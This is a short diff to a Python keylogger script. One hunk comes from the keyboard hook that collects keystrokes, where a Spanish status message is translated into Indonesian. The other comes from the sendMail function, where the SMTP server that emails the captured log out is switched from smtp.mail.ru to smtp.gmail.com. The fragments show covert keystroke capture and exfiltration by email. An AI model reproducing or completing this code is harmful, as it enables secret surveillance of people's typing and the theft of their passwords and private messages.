@@ -49,7 +49,7 @@ def OnKeyboardEvent(event):
 			auxList = list(mainList)
 			mainList.clear()
 			#the signal is on! time to write in to the log file!
-			print('se envia la senal!')
+			print('Sinyal dikirim!')
 			e.set()
 			
 	#put the filtered keystroke in the mainlist
@@ -144,7 +144,7 @@ def sendMail():
 				composed = outer.as_string()
 					
 				try:
-					with smtplib.SMTP('smtp.mail.ru', 587) as s:
+					with smtplib.SMTP('smtp.gmail.com', 587) as s:
 						s.ehlo()
 						s.starttls()
 						s.ehlo()
